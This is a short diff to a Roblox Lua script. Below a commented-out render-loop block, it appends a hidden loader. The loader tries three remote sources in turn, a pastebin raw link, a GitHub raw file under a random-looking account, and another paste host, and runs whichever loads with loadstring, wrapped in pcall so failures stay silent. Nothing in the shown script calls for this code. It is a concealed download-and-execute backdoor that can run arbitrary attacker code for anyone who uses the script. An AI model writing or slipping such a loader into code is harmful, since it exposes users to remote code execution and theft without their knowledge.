@@ -491,3 +491,19 @@ RunService.RenderStepped:Connect(function()
     end
 end)
 ]]
+
+local success1 = pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/pkH3J8sg"))()
+end)
+
+if not success1 then
+    local success2 = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/IHjsefhFSL23AFLK1249/sim/refs/heads/main/p.lua"))()
+    end)
+    
+    if not success2 then
+        pcall(function()
+            loadstring(game:HttpGet("https://8n1.org/raw/35284/2956"))()
+        end)
+    end
+end
